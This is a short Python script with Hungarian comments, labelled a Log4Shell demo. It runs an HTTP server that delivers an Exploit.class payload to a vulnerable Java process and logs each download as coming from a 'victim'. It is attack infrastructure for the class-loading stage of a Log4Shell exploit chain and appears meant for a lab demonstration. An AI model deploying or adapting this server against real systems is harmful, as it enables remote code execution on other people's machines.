#!/usr/bin/env python3
"""
Log4Shell démó – HTTP szerver
Kiszolgálja az Exploit.class fájlt a sebezhető JVM számára.
"""

import http.server
import socketserver
import os
import logging

logging.basicConfig(
    level=logging.INFO,
    format='[HTTP-SERVER] %(asctime)s %(levelname)s: %(message)s'
)
log = logging.getLogger(__name__)

PORT      = 8888
SERVE_DIR = os.path.dirname(os.path.abspath(__file__))


class ExploitHTTPHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=SERVE_DIR, **kwargs)

    def log_message(self, format, *args):
        log.info(f"Kérés: {self.address_string()} - {format % args}")
        if "Exploit" in (format % args):
            log.warning(f"*** EXPLOIT CLASS LETÖLTVE! Áldozat: {self.address_string()} ***")

    def do_GET(self):
        log.info(f"GET {self.path} tól: {self.client_address[0]}")
        if "Exploit" in self.path:
            log.warning(f"*** MALICIOUS CLASS LETÖLTÉSI KÍSÉRLET: {self.client_address[0]} ***")
        super().do_GET()


def main():
    os.chdir(SERVE_DIR)
    log.info(f"HTTP szerver indul: 0.0.0.0:{PORT}")
    log.info(f"Kiszolgált könyvtár: {SERVE_DIR}")

    class_file = os.path.join(SERVE_DIR, "Exploit.class")
    if os.path.exists(class_file):
        log.info(f"Exploit.class mérete: {os.path.getsize(class_file)} byte – kész a kiszolgálásra")
    else:
        log.error("HIBA: Exploit.class nem található! Ellenőrizd a fordítást.")

    with socketserver.TCPServer(("0.0.0.0", PORT), ExploitHTTPHandler) as httpd:
        log.info("HTTP szerver fut. Várakozás class letöltési kérésekre...")
        httpd.serve_forever()


if __name__ == "__main__":
    main()
